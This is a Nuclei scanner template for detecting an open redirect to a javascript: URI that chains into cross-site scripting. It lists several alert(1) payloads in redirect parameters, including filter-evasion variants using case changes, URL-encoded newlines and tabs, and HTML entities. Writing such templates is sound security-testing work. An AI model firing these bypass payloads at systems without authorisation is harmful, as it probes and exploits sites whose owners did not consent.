id: m7-redirect-javascript
info:
  name: M7 - Open Redirect to JavaScript Protocol (XSS Chain)
  author: Sharlix
  severity: high
  description: Open redirect to javascript: URI leading to XSS
  tags: redirect,xss,javascript,m7hunter

requests:
  - method: GET
    path:
      - "{{BaseURL}}?url=javascript:alert(1)"
      - "{{BaseURL}}?redirect=javascript:alert(1)"
      - "{{BaseURL}}?next=javascript:alert(1)"
      - "{{BaseURL}}?url=JAVASCRIPT:alert(1)"
      - "{{BaseURL}}?url=java%0ascript:alert(1)"
      - "{{BaseURL}}?url=java%09script:alert(1)"
      - "{{BaseURL}}?url=java&#0000010;script:alert(1)"

    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "Location:.*javascript:"
        part: header

      - type: word
        words:
          - "javascript:alert"
        part: body
